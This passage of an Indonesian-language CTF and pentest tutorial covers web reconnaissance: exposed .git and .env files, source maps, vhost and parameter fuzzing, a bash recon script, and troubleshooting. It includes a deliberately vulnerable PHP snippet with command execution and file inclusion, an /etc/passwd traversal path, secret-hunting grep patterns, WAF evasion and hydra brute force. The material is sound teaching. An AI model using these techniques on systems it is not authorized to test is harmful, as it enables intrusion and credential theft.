| **Generic Backup**        | `.txt`, `.bak`, `.old`, `.zip`, `.tar.gz`, `.sql`, `.7z`   | Database dump (`dump.sql`), arsip source code lengkap (`backup.tar.gz`), catatan kredensial (`notes.txt`). |
| **Configuration**         | `.conf`, `.cfg`, `.env`, `.ini`, `.xml`, `.yml`, `.yaml`   | Database connection strings, API private keys, master tokens.                                              |

---

## 🔬 BAGIAN 5: SOURCE CODE ANALYSIS

Jangan mengira exploitasi web selalu membutuhkan tool rumit. Sering kali password root atau celah RCE terpampang jelas di balik View Source!

### 5.1 Browser Developer Tools (F12)
Empat tab browser yang wajib Anda kuasai:
1. **Page Source (`Ctrl + U`)**: Menampilkan raw HTML mentah yang dikirim oleh server.
2. **Inspector (`Elements`)**: Menampilkan struktur DOM saat ini setelah dieksekusi oleh JavaScript dinamis.
3. **Network Tab**: Menampilkan semua request HTTP/HTTPS (GET/POST), API calls, response headers, dan status code secara real-time. Aktifkan checkbox *Disable Cache* dan *Preserve Log*.
4. **Console Tab**: Melihat error JavaScript, log eksekusi, dan tempat mengevaluasi kode JS langsung di client side.

### 5.2 Checklist Temuan di Source Code

- [ ] **HTML Comments (`<!-- ... -->`)**: Developer sering meninggalkan catatan sementara, instruksi TODO, kredensial demo (`admin:P@ssword123`), atau nama file script tersembunyi.
- [ ] **Hidden Input Fields**: `<input type="hidden" name="is_admin" value="false">` (Manipulasi nilai ini di Burp Suite!).
- [ ] **Hardcoded API Keys & Tokens**: String berupa JWT token, Firebase URL, AWS Access Key (`AKIA...`), Google API Key.
- [ ] **External JavaScript References**: Skrip yang di-include dari path internal seperti `/static/js/admin_bundle.js`.
- [ ] **Endpoints & Routes Tersembunyi**: Variabel JavaScript yang menyimpan daftar path API internal.
- [ ] **Versi Library Frontend**: Komentar versi Bootstrap, jQuery 1.x (rentan XSS), AngularJS kuno.

### 5.3 JavaScript File Analysis

Aplikasi web modern (Single Page Applications / React / Vue / Angular) meletakkan banyak logika bisnis di sisi klien.

```bash
# 1. Download file JavaScript target secara rekursif
wget -r -l 2 -A "*.js" -P ./js_recon/ http://TARGET/assets/js/

# 2. Grep kata kunci sensitif di seluruh file JavaScript yang di-download
grep -rnEi "api[_-]?key|password|secret|token|auth|bearer|credential" ./js_recon/

# 3. Grep endpoint URL dan path internal
grep -rnEo "https?://[a-zA-Z0-9./?=_-]*" ./js_recon/
grep -rnEo "/(api|v1|v2|admin|user|auth)/[a-zA-Z0-9./?=_-]*" ./js_recon/

# 4. Analisis endpoint menggunakan LinkFinder (Tool Python populer)
# Install: git clone https://github.com/GerbenJavado/LinkFinder.git
python3 linkfinder.py -i http://TARGET/main.js -o cli
```

**Source Map Files (`.map`) — The Ultimate Goldmine:**
Saat developer melakukan *bundling* atau *minifying* JavaScript, mereka sering lupa menghapus file source map. Jika file bernama `app.bundle.js` ada, periksa keberadaan `app.bundle.js.map`!

```bash
# 1. Cek apakah .map file tersedia
curl -s -I http://TARGET/static/js/main.chunk.js.map

# 2. Rekonstruksi Source Code Asli (3 Alternatif Andal):

# --- Alternatif 1: sourcemapper (Python, Sangat Aktif & Andal) ---
pip3 install sourcemapper
sourcemapper -url http://TARGET/static/js/main.chunk.js.map -output ./restored_src/

# --- Alternatif 2: source-map-explorer (npm) ---
npm install -g source-map-explorer
source-map-explorer main.chunk.js main.chunk.js.map

# --- Alternatif 3: Script Python Mandiri (Zero Dependency / Built-in Standard Library) ---
curl -s http://TARGET/static/js/main.chunk.js.map | python3 -c "
import json, sys, os
data = json.load(sys.stdin)
for i, src in enumerate(data.get('sources', [])):
    content = data.get('sourcesContent', [])[i] if i < len(data.get('sourcesContent', [])) else ''
    if content:
        out_path = os.path.join('restored_src', src.replace('../', '').lstrip('/'))
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f'[+] Extracted: {src}')
"
```

### 5.4 Git Exposure Detection (`.git` Folder)

Jika developer meng-clone repository langsung ke folder web production (`/var/www/html/`), folder `.git` sering tertinggal dan terbuka ke publik!

```bash
# 1. Cek apakah .git terbuka
curl -s -I http://TARGET/.git/HEAD
# Jika response '200 OK' dan memuat teks 'ref: refs/heads/master' -> VULNERABLE!

# 2. Dump seluruh repository Git target ke komputer lokal menggunakan git-dumper
# Install git-dumper:
sudo apt install git-dumper -y
# Atau: pip3 install git-dumper

# 3. Eksekusi dumping repository
git-dumper http://TARGET/.git/ ./dumped_repo/

# 4. Masuk ke folder hasil dump dan analisa commit history
cd ./dumped_repo/
git status
git log -n 5                 # Periksa riwayat commit developer
git diff HEAD~1 HEAD         # Periksa perubahan kode terakhir
git log -p | grep -Ei "password|secret|key|user"  # Cari creds yang pernah di-commit lalu dihapus!
```

---

## 🌐 BAGIAN 6: VIRTUAL HOST ENUMERATION

### 6.1 Apa itu Virtual Host (VHost)?

Dalam arsitektur web modern, satu alamat IP fisik server sering kali menampung **puluhan situs web berbeda**. Bagaimana server membedakan situs mana yang ingin dibuka oleh browser?

```text
+=============================================================================+
|                  ANALOGI: SATU GEDUNG BANYAK KANTOR                         |
+=============================================================================+
|                                                                             |
|  Alamat IP (10.10.11.200) = Alamat fisik gedung kantor raksasa.             |
|  Header "Host: target.htb"       = Anda ingin ke Kantor Utama di Lantai 1.   |
|  Header "Host: dev.target.htb"   = Anda ingin ke Ruang R&D Rahasia Lantai 3. |
|  Header "Host: admin.target.htb" = Anda ingin ke Ruang Kontrol Lantai B2.   |
|                                                                             |
|  Jika Anda hanya mengakses IP mentah http://10.10.11.200, web server        |
|  (Apache/Nginx) akan menyajikan 'Default Site' yang biasanya membosankan    |
|  (halaman Apache default atau under construction).                          |
|  Harta karun CTF sebenarnya tersembunyi di balik VHost lain!                |
|                                                                             |
+=============================================================================+
```

**Perbedaan Subdomain vs Virtual Host:**
- **Subdomain Publik**: Memiliki catatan DNS resmi di internet (bisa di-resolve oleh `8.8.8.8`).
- **Virtual Host Internal**: Dikonfigurasi di file web server (`/etc/apache2/sites-enabled/` atau `/etc/nginx/sites-enabled/`), tetapi **tidak terdaftar** di DNS server publik. Untuk mengaksesnya, kita harus memanipulasi header HTTP `Host:` secara manual.

### 6.2 Wordlist untuk VHost

SecLists menyediakan wordlist subdomain yang sangat cocok untuk fuzzing VHost:
- `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` (Rekomendasi Utama CTF - 5.000 kata, cepat dan mencakup 95% nama umum).
- `/usr/share/seclists/Discovery/DNS/namelist.txt` (~1.900 kata).
- `/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt` (Untuk target yang lebih sulit).

### 6.3 ffuf VHost Fuzzing — MASTER PROCEDURE

Fuzzing VHost **WAJIB** menggunakan filter ukuran (`-fs`), karena jika VHost tidak ditemukan, server tetap merespons `200 OK` dengan halaman default!

**Prosedur 3 Langkah:**
1. **Cek Baseline Ukuran Halaman Default**:

```bash
# Lakukan request dengan Host header acak yang pasti tidak ada
curl -s -i http://10.10.11.200 -H "Host: nonexistentsubdomainxyz.target.htb" | grep -i "Content-Length"
# Misal respon menunjukkan Content-Length: 3120 bytes
```

2. **Jalankan ffuf dengan menyaring ukuran baseline tersebut (`-fs 3120`)**:

```bash
ffuf -u http://10.10.11.200 \
     -H "Host: FUZZ.target.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs 3120 \
     -c -t 50
```

**Contoh Output Nyata VHost Discovery:**

```text
$ ffuf -u http://10.10.11.200 -H "Host: FUZZ.target.htb" -w subdomains-top1million-5000.txt -fs 3120 -c

admin                   [Status: 200, Size: 4120, Words: 320, Lines: 85, Duration: 46ms]
dev                     [Status: 200, Size: 1845, Words: 95, Lines: 42, Duration: 44ms]
staging                 [Status: 302, Size: 240, Words: 15, Lines: 8, Duration: 45ms]
```

### 6.4 Gobuster VHost Mode

```bash
# Gobuster vhost syntax
gobuster vhost -u http://target.htb \
               -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
               --append-domain \
               -t 40
```

### 6.5 Cara Menambahkan VHost ke `/etc/hosts` (WAJIB)

Begitu Anda menemukan Virtual Host baru (misal `dev.target.htb` dan `admin.target.htb`), browser Anda tidak akan bisa membukanya sebelum Anda memetakan nama domain tersebut ke IP target di sistem operasi Parrot OS Anda:

```bash
# Tambahkan domain utama dan vhost temuan ke /etc/hosts
echo "10.10.11.200 target.htb dev.target.htb admin.target.htb" | sudo tee -a /etc/hosts

# Verifikasi resolusi lokal:
ping -c 1 target.htb

# Sekarang Anda bisa membuka http://dev.target.htb di Firefox atau Burp Suite!
```

---

## 🎯 BAGIAN 7: PARAMETER DISCOVERY

### 7.1 Apa itu Parameter Discovery?

Sering kali sebuah halaman tampak statis dan tidak memiliki formulir input (misal `http://TARGET/item.php`). Namun di dalam kode PHP-nya tersembunyi parameter rahasia yang menerima input:

```text
<?php
    // Developer lupa menghapus parameter debug:
    if (isset($_GET['debug'])) {
        system($_GET['debug']); // REMOTE CODE EXECUTION LANGSUNG!
    }
    if (isset($_GET['file'])) {
        include($_GET['file']); // LOCAL FILE INCLUSION!
    }
?>
```

Jika Anda tidak melakukan parameter fuzzing, Anda tidak akan pernah tahu bahwa `?debug=` atau `?file=` ada!

### 7.2 Arjun — Specialized Parameter Discovery Tool

`Arjun` adalah tool tercepat dan paling cerdas yang secara otomatis mendeteksi parameter tersembunyi (GET, POST URL-encoded, POST JSON) menggunakan wordlist optimal dan dynamic payload injection.

```bash
# 1. Install Arjun di Parrot OS (via pipx atau pip)
sudo apt install python3-pipx -y
pipx install arjun

# 2. Cari parameter GET pada endpoint target:
arjun -u http://TARGET/page.php -m GET

# 3. Cari parameter POST URL-encoded:
arjun -u http://TARGET/login.php -m POST

# 4. Cari parameter POST JSON pada REST API:
arjun -u http://TARGET/api/v1/user -m JSON

# 5. Export hasil ke JSON:
arjun -u http://TARGET/view.php -oJ arjun_results.json
```

**Contoh Output Nyata Arjun:**

```text
$ arjun -u http://10.10.11.140/utility.php -m GET
[*] Probing endpoint: http://10.10.11.140/utility.php
[+] Valid parameter found: file
[+] Valid parameter found: test_mode
[+] Scanning completed. 2 parameter(s) discovered.
```

*(Implikasi: Langsung uji `http://10.10.11.140/utility.php?file=../../../../etc/passwd` untuk mengeksploitasi LFI!)*

### 7.3 ffuf untuk Parameter Fuzzing

Jika Arjun tidak tersedia, `ffuf` siap menggantikannya dengan sangat tangguh:

```bash
# 1. GET Parameter Discovery via ffuf:
ffuf -u "http://TARGET/index.php?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs [BASELINE_SIZE] -c

# 2. POST Parameter Discovery via ffuf:
ffuf -u "http://TARGET/admin.php" \
     -X POST -d "FUZZ=1" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs [BASELINE_SIZE] -c
```

---

## 📂 BAGIAN 8: INFORMATION DISCLOSURE

### 8.1 Common Locations untuk Sensitive Files

Banyak pentest selesai hanya dalam 5 menit karena developer meninggalkan file konfigurasi atau backup di web root. Selalu uji path-path krusial berikut:

| Path Sensitif | Kategori & Isi Informasi | Perintah cURL Verifikasi Cepat |
|---|---|---|
| `/robots.txt` | Daftar direktori tersembunyi | `curl -s -i http://TARGET/robots.txt` |
| `/sitemap.xml` | Peta struktur URL website | `curl -s -i http://TARGET/sitemap.xml` |
| `/.well-known/security.txt` | Kontak keamanan & PGP key | `curl -s -i http://TARGET/.well-known/security.txt` |
| `/.git/HEAD` | Git repository terbuka | `curl -s -i http://TARGET/.git/HEAD` |
| `/.env` | Kredensial DB, Secret API Keys | `curl -s -i http://TARGET/.env` |
| `/phpinfo.php` atau `/info.php` | Konfigurasi PHP, path, modules | `curl -s -i http://TARGET/phpinfo.php` |
| `/server-status` | Apache internal active connections | `curl -s -i http://TARGET/server-status` |
| `/server-info` | Apache internal module info | `curl -s -i http://TARGET/server-info` |
| `/config.php.bak` / `/config.inc.old` | Backup file konfigurasi PHP | `curl -s -i http://TARGET/config.php.bak` |
| `/wp-config.php.bak` | Kredensial database WordPress | `curl -s -i http://TARGET/wp-config.php.bak` |
| `/web.config` | IIS / ASP.NET connection strings | `curl -s -i http://TARGET/web.config` |
| `/.htaccess` | Apache rewrite & auth rules | `curl -s -i http://TARGET/.htaccess` |
| `/backup.zip` / `/backup.tar.gz` | Arsip seluruh source code | `curl -s -I http://TARGET/backup.zip` |
| `/db.sql` / `/dump.sql` | Raw database export | `curl -s -I http://TARGET/db.sql` |
| `/admin/` atau `/administrator/` | Portal manajemen sistem | `curl -s -i http://TARGET/admin/` |
| `/api/` / `/api/v1/` / `/swagger/` | Dokumentasi REST API | `curl -s -i http://TARGET/swagger.json` |
| `/actuator/env` | Spring Boot actuator secrets | `curl -s -i http://TARGET/actuator/env` |
| `/actuator/heapdump` | Spring Boot memory dump (Password!) | `curl -s -I http://TARGET/actuator/heapdump` |
| `/.svn/entries` | SVN repository metadata | `curl -s -i http://TARGET/.svn/entries` |
| `/.DS_Store` | Mac OS metadata (list nama file!) | `curl -s -I http://TARGET/.DS_Store` |

### 8.2 Shodan, Censys, & Certificate Transparency

Untuk pengintaian pasif tanpa menyentuh IP target secara langsung:

```bash
# 1. Shodan Query untuk mencari target spesifik:
# Mencari server berdasarkan IP atau organisasi:
shodan host TARGET_IP
shodan search "org:'Target Organization' http.title:'Dashboard'"

# 2. Certificate Transparency Logs (crt.sh):
# Mengungkap semua subdomain yang pernah mendaftarkan SSL Certificate:
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# 3. Wayback Machine (Melihat file atau endpoint lama yang mungkin sudah dihapus dari menu):
curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&fl=original&collapse=urlkey" | jq -r '.[][0]'
```

### 8.3 Google Dorking untuk Web Application Pentest

Gunakan Google Dorks untuk menemukan file yang tidak sengaja terindeks:
- `site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx` : Dokumen internal yang memuat nama user/kebijakan.
- `site:target.com inurl:admin OR inurl:login OR inurl:portal` : Menemukan pintu masuk administratif alternatif.
- `site:target.com intitle:"index of /"` : Menemukan direktori terbuka (*directory listing*).
- `site:target.com inurl:".php?id="` : Menemukan parameter dinamis untuk pengujian SQLi.
- `site:target.com ext:env OR ext:yml OR ext:log` : File konfigurasi dan error log publik.

---

## 🤖 BAGIAN 9: WEB RECON AUTOMATION SCRIPT

Berikut adalah skrip bash profesional siap pakai untuk mengotomatiskan seluruh rangkaian web recon tahap awal di Parrot OS. Skrip ini menghasilkan laporan terstruktur dan rapi.

```bash
#!/usr/bin/env bash
# ==============================================================================
# web_recon.sh - Automated Web Reconnaissance Suite for CTF & Pentesting
# Platform : Parrot OS / Debian CLI
# Author   : Cybersecurity Master Workflow Series
# Usage    : ./web_recon.sh <TARGET_URL> [CUSTOM_PORT]
# Example  : ./web_recon.sh http://10.10.11.200
# ==============================================================================

set -euo pipefail

# --- Color Palette ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

if [[ $# -lt 1 ]]; then
    echo -e "${RED}[!] Usage: $0 <TARGET_URL> (e.g. http://10.10.11.200 or http://target.htb)${NC}"
    exit 1
fi

TARGET="$1"
# Bersihkan trailing slash
TARGET="${TARGET%/}"

DATE_STAMP=$(date +"%Y%m%d_%H%M%S")
HOST_NAME=$(echo "$TARGET" | awk -F[/:] '{print $4}')
[[ -z "$HOST_NAME" ]] && HOST_NAME="target"

OUTPUT_DIR="recon_${HOST_NAME}_${DATE_STAMP}"
mkdir -p "$OUTPUT_DIR"

echo -e "${CYAN}${BOLD}"
cat << "EOF"
 __      __      ___.   __________                         
/  \    /  \ ____\_ |__ \______   \ ____   ____  ____   ____  
\   \/\/   // __ \| __ \ |       _// __ \_/ ___\/  _ \ /    \ 
 \        /|  ___/| \_\ \|    |   \  ___/\  \__(  <_> )   |  \
  \__/\  /  \___  >___  /|____|_  /\___  >\___  >____/|___|  /
       \/       \/    \/        \/     \/     \/           \/ 
EOF
echo -e "${NC}"
echo -e "${BLUE}[*] Target           : ${BOLD}$TARGET${NC}"
echo -e "${BLUE}[*] Output Directory : ${BOLD}$OUTPUT_DIR${NC}"
echo -e "${BLUE}[*] Started At       : $(date)${NC}"
echo -e "----------------------------------------------------------------------"

# --- 1. Technology Detection ---
echo -e "\n${YELLOW}[+] [1/6] Running Technology Detection (WhatWeb & curl headers)...${NC}"
whatweb -a 3 -v "$TARGET" > "$OUTPUT_DIR/whatweb.txt" 2>&1 || true
curl -s -I -L -k "$TARGET" > "$OUTPUT_DIR/headers.txt" 2>&1 || true

SERVER_HEADER=$(grep -i "^Server:" "$OUTPUT_DIR/headers.txt" | tr -d '\r' || echo "Not Disclosed")
POWERED_BY=$(grep -i "^X-Powered-By:" "$OUTPUT_DIR/headers.txt" | tr -d '\r' || echo "Not Disclosed")
echo -e "    ${GREEN}[✓] Server Header     : $SERVER_HEADER${NC}"
echo -e "    ${GREEN}[✓] Powered-By Header : $POWERED_BY${NC}"

# --- 2. Checking robots.txt & sitemap.xml ---
echo -e "\n${YELLOW}[+] [2/6] Inspecting robots.txt & sitemap.xml...${NC}"
ROBOTS_HTTP=$(curl -s -o "$OUTPUT_DIR/robots.txt" -w "%{http_code}" "$TARGET/robots.txt" || echo "000")
if [[ "$ROBOTS_HTTP" == "200" ]]; then
    DISALLOW_COUNT=$(grep -ci "Disallow:" "$OUTPUT_DIR/robots.txt" || echo "0")
    echo -e "    ${GREEN}[✓] robots.txt FOUND (Status 200) with $DISALLOW_COUNT entries!${NC}"
else
    echo -e "    ${BLUE}[-] robots.txt not found (HTTP $ROBOTS_HTTP).${NC}"
fi

SITEMAP_HTTP=$(curl -s -o "$OUTPUT_DIR/sitemap.xml" -w "%{http_code}" "$TARGET/sitemap.xml" || echo "000")
if [[ "$SITEMAP_HTTP" == "200" ]]; then
    echo -e "    ${GREEN}[✓] sitemap.xml FOUND (Status 200)!${NC}"
else
    echo -e "    ${BLUE}[-] sitemap.xml not found (HTTP $SITEMAP_HTTP).${NC}"
fi

# --- 3. Sensitive Files Quick Probing ---
echo -e "\n${YELLOW}[+] [3/6] Probing High-Value Sensitive Endpoints...${NC}"
SENSITIVE_PATHS=(
    "/.git/HEAD"
    "/.env"
    "/phpinfo.php"
    "/info.php"
    "/server-status"
    "/config.php.bak"
    "/web.config"
    "/admin"
    "/api"
    "/swagger.json"
    "/backup.zip"
    "/dump.sql"
)

> "$OUTPUT_DIR/sensitive_hits.txt"
for path in "${SENSITIVE_PATHS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -k "$TARGET$path" || echo "000")
    if [[ "$STATUS" == "200" || "$STATUS" == "301" || "$STATUS" == "302" || "$STATUS" == "403" ]]; then
        echo -e "    ${GREEN}[!] HIT: $path (HTTP $STATUS)${NC}"
        echo "$path (HTTP $STATUS)" >> "$OUTPUT_DIR/sensitive_hits.txt"
    fi
done

# --- 4. Quick Directory Fuzzing via ffuf ---
echo -e "\n${YELLOW}[+] [4/6] Executing Fast Directory Fuzzing via ffuf...${NC}"
WORDLIST="/usr/share/dirb/wordlists/common.txt"
if [[ ! -f "$WORDLIST" ]]; then
    WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
fi

if command -v ffuf >/dev/null 2>&1 && [[ -f "$WORDLIST" ]]; then
    echo -e "    ${BLUE}[*] Wordlist : $WORDLIST${NC}"
    ffuf -u "$TARGET/FUZZ" \
         -w "$WORDLIST" \
         -mc 200,204,301,302,307,401,403 \
         -o "$OUTPUT_DIR/ffuf_quick.json" -of json \
         -s -t 40 || true
    
    HITS_COUNT=$(grep -o '"status":' "$OUTPUT_DIR/ffuf_quick.json" 2>/dev/null | wc -l || echo "0")
    echo -e "    ${GREEN}[✓] ffuf completed! Discovered $HITS_COUNT paths.${NC}"
else
    echo -e "    ${RED}[!] ffuf or common.txt not found. Skipping fast fuzzing.${NC}"
fi

# --- 5. Source Code & JavaScript Extraction ---
echo -e "\n${YELLOW}[+] [5/6] Extracting JavaScript Assets & HTML Comments...${NC}"
curl -s -k "$TARGET" > "$OUTPUT_DIR/index.html" || true
grep -oP '<!--[\s\S]*?-->' "$OUTPUT_DIR/index.html" > "$OUTPUT_DIR/html_comments.txt" 2>&1 || true
grep -oP 'src=["\']([^"\']+\.js)["\']' "$OUTPUT_DIR/index.html" | awk -F["\'] '{print $2}' > "$OUTPUT_DIR/js_links.txt" 2>&1 || true

COMMENTS_COUNT=$(wc -l < "$OUTPUT_DIR/html_comments.txt" || echo "0")
JS_COUNT=$(wc -l < "$OUTPUT_DIR/js_links.txt" || echo "0")
echo -e "    ${GREEN}[✓] Extracted $COMMENTS_COUNT comment lines & $JS_COUNT JavaScript files.${NC}"

# --- 6. Summary Report Generation ---
echo -e "\n${YELLOW}[+] [6/6] Generating Executive Recon Summary...${NC}"
cat << SUMMARY_EOF > "$OUTPUT_DIR/summary.txt"
================================================================================
                   WEB RECONNAISSANCE EXECUTIVE SUMMARY
================================================================================
Target URL          : $TARGET
Scan Date           : $(date)
Server Header       : $SERVER_HEADER
X-Powered-By        : $POWERED_BY
Robots.txt Status   : $ROBOTS_HTTP
Sitemap.xml Status  : $SITEMAP_HTTP
Sensitive Hits      : $(wc -l < "$OUTPUT_DIR/sensitive_hits.txt") found
FFUF Directory Hits : ${HITS_COUNT:-0} found
================================================================================
Reports saved in    : $OUTPUT_DIR/
SUMMARY_EOF

cat "$OUTPUT_DIR/summary.txt"
echo -e "\n${GREEN}${BOLD}[✔] Reconnaissance completed successfully! Check folder: $OUTPUT_DIR/${NC}\n"
```

---

## 🧭 BAGIAN 10: DECISION TREE UTAMA

Berikut adalah **Mega Decision Tree** yang menjadi panduan navigasi mental Anda setiap kali menemukan web server di CTF:

```text
                      [ PORT 80 / 443 / 8080 DITEMUKAN ]
                                      │
                                      ▼
                        [ TAHAP 1: TECHNOLOGY RECON ]
                       curl -I / whatweb / devtools
                                      │
         ┌────────────────────────────┼────────────────────────────┐
         ▼                            ▼                            ▼
   [ CMS TERDETEKSI ]       [ FRAMEWORK TERDETEKSI ]      [ CUSTOM / STATIC APP ]
         │                            │                            │
 ┌───────┴───────┐           ┌────────┴────────┐           ┌───────┴───────┐
 ▼               ▼           ▼                 ▼           ▼               ▼
WordPress     Joomla/Drupal PHP / Apache   Node / Python  Cek robots.txt &  Directory Fuzzing
wpscan        droopescan    - .php ekstensi - .js / .json sitemap.xml       ffuf medium
- plugins     - components  - phpinfo leaks - NoSQL / SSTI - Disallow hits  - status filter
- themes      - RCE CVE     - LFI / upload  - .env leaks  - hidden paths   - response size
│             │             │                 │           │                │
└──────┬──────┘             └────────┬────────┘           └────────┬───────┘
       │                             │                             │
       └─────────────────────────────┼─────────────────────────────┘
                                     ▼
                         [ TAHAP 2: VIRTUAL HOSTING ]
                   ffuf -H "Host: FUZZ.target.htb" -fs [BASE]
                                     │
                     ┌───────────────┴───────────────┐
                     ▼                               ▼
            [ VHost Ditemukan ]             [ Tidak Ada VHost ]
            Tambahkan ke /etc/hosts         Lanjut ke Fuzzing Direktori Utama
            Mulai recon dari Tahap 1
                     │                               │
                     └───────────────┬───────────────┘
                                     ▼
                         [ TAHAP 3: SOURCE & JS AUDIT ]
                     - Cari comment HTML (Ctrl+U)
                     - Cek /.git/HEAD (git-dumper)
                     - Grep API keys di file .js / .map
                                     │
                                     ▼
                         [ TAHAP 4: PARAMETER DISCOVERY ]
                     arjun -u target/page -m GET/POST
                     ffuf -u target/page?FUZZ=test
                                     │
         ┌───────────────────────────┼───────────────────────────┐
         ▼                           ▼                           ▼
  [ Parameter '?file=' ]     [ Parameter '?id=' ]        [ Parameter '?cmd=' ]
   -> Test LFI / Path         -> Test SQL Injection       -> Test Command Injection
      Traversal                  Auth Bypass                 Reverse Shell!
```

---

## ⚠️ BAGIAN 11: COMMON ERRORS & TROUBLESHOOTING

Berikut adalah 10 kendala paling sering yang membuat pemula frustrasi saat melakukan web reconnaissance beserta solusinya:

#### 1. Wildcard 200 OK / Soft 404 (Semua Hasil ffuf Menghasilkan 200)
```text
ERROR / GEJALA:
ffuf menampilkan ribuan baris kata dari wordlist dengan Status 200 OK,
padahal halaman tersebut sebenarnya tidak ada.
```

**Penyebab:** Web server dikonfigurasi untuk me-redirect semua request yang salah ke halaman custom (Soft 404) dengan HTTP status 200.
**Solusi & Command Fix:**
1. Jalankan request ke path yang mustahil ada untuk melihat ukuran halaman error:
```bash
curl -s -i http://TARGET/randomnonexistentstring12345 | grep -i "Content-Length"
```

2. Ambil nilai Content-Length (misal: 3412 bytes), lalu tambahkan flag `-fs 3412` pada ffuf:
```bash
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fs 3412 -c
```

3. Jika ukurannya berubah-ubah tetapi jumlah katanya sama, gunakan filter kata `-fw` atau filter baris `-fl`:
```bash
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fw 45 -fl 12 -c
```


#### 2. WAF / Cloudflare / ModSecurity Memblokir Scanning (HTTP 403 Forbidden)
```text
ERROR / GEJALA:
Awalnya scan berjalan lancar, namun mendadak semua response berubah menjadi 403 Forbidden
atau 'Access Denied / Protected by ModSecurity'.
```

**Penyebab:** Rate request terlalu cepat dan User-Agent default tool (misal `ffuf` atau `gobuster`) di-blacklist oleh WAF.
**Solusi & Command Fix:**
Ganti User-Agent menjadi browser Firefox asli dan perlambat request rate:
```bash
ffuf -u http://TARGET/FUZZ -w wordlist.txt \
     -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
     -rate 20 -t 5 -p 0.2 -c
```


#### 3. Rate Limit Triggered (HTTP 429 Too Many Requests)
```text
ERROR / GEJALA:
Server merespons: HTTP/1.1 429 Too Many Requests.
```

**Penyebab:** Target memiliki middleware pembatas rate (misal `express-rate-limit` atau `nginx limit_req`).
**Solusi & Command Fix:**
Turunkan thread ke angka minimum dan tambahkan delay:
```bash
# Jalankan single-threaded dengan delay 0.5 detik antar request
ffuf -u http://TARGET/FUZZ -w wordlist.txt -t 1 -p 0.5 -mc 200,301,302
```


#### 4. Wordlist Mismatch (Fuzzing PHP padahal Target Node.js)
```text
ERROR / GEJALA:
Fuzzing 200.000 baris selesai tapi tidak menemukan satu pun file/endpoint.
```

**Penyebab:** Menggunakan flag `-x .php` pada web server yang menjalankan Python Flask atau Node.js Express.
**Solusi & Command Fix:**
Selalu cek kembali hasil WhatWeb atau HTTP header `Server:` / `X-Powered-By:`. Sesuaikan ekstensi:
```bash
# Jika Node.js / Python / Go: route web biasanya TANPA ekstensi!
# Fuzz nama direktori/route mentah:
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```


#### 5. SSL / TLS Certificate Error (Self-Signed / Untrusted)
```text
ERROR / GEJALA:
curl: (60) SSL certificate problem: self-signed certificate
ffuf: x509: certificate signed by unknown authority
```

**Penyebab:** Mesin CTF sering kali menggunakan self-signed SSL certificate.
**Solusi & Command Fix:**
Tambahkan flag insecure untuk mengabaikan verifikasi sertifikat:
```bash
# Untuk curl gunakan -k:
curl -k -I https://TARGET

# Untuk ffuf gunakan flag -k (WAJIB untuk mengabaikan error verifikasi SSL):
ffuf -u https://TARGET/FUZZ -w wordlist.txt -c -k
```


#### 6. Infinite Redirect Loop (Status 301/302 Mengarah ke Dirinya Sendiri)
```text
ERROR / GEJALA:
curl: (47) Maximum (50) redirects followed
```

**Penyebab:** Server memaksa redirect ke trailing slash (`/`) atau ke domain FQDN tertentu (misal IP diarahkan ke `http://target.htb/`).
**Solusi & Command Fix:**
1. Matikan auto-follow redirect di curl/ffuf untuk melihat header `Location:`:
```bash
curl -s -i http://TARGET | grep -i "Location:"
```

2. Jika diarahkan ke nama domain (misal `http://target.htb/`), tambahkan domain tersebut ke `/etc/hosts` terlebih dahulu:
```bash
echo "10.10.11.200 target.htb" | sudo tee -a /etc/hosts
```


#### 7. Connection Timeout / Target Down
```text
ERROR / GEJALA:
ffuf: Request to http://TARGET/FUZZ timed out
```

**Penyebab:** Threading terlalu tinggi (`-t 100+`) menenggelamkan web server CTF yang spesifikasi memorinya kecil.
**Solusi & Command Fix:**
Turunkan timeout dan kurangi thread secara signifikan:
```bash
ffuf -u http://TARGET/FUZZ -w wordlist.txt -timeout 15 -t 20
```


#### 8. Host Header Required (Mengakses IP Mentah Mengembalikan Halaman Default)
```text
ERROR / GEJALA:
Membuka http://10.10.11.200 menampilkan halaman 'It works! Apache Default Page',
padahal deskripsi tantangan CTF adalah web aplikasi dinamis.
```

**Penyebab:** Web server dikonfigurasi dengan *Name-Based Virtual Hosting* yang hanya menyajikan aplikasi jika header `Host:` cocok.
**Solusi & Command Fix:**
Kirim request dengan Host header sesuai domain box:
```bash
curl -s -I http://10.10.11.200 -H "Host: target.htb"
# Jika status berubah dari 404/Default menjadi 200 OK, tambahkan ke /etc/hosts!
```


#### 9. HTTP Basic Authentication Popup (HTTP 401 Unauthorized)
```text
ERROR / GEJALA:
Akses ke /admin/ memunculkan prompt username & password dengan status HTTP 401.
```

**Penyebab:** Direktori dilindungi oleh file `.htpasswd`.
**Solusi & Command Fix:**
1. Uji kredensial default (`admin:admin`, `admin:password`, `root:toor`):
```bash
curl -s -u "admin:admin" http://TARGET/admin/
```

2. Jika gagal, jalankan brute force terarah menggunakan hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-get /admin/
```


#### 10. URL Encoding Issues pada Parameter / Ekstensi
```text
ERROR / GEJALA:
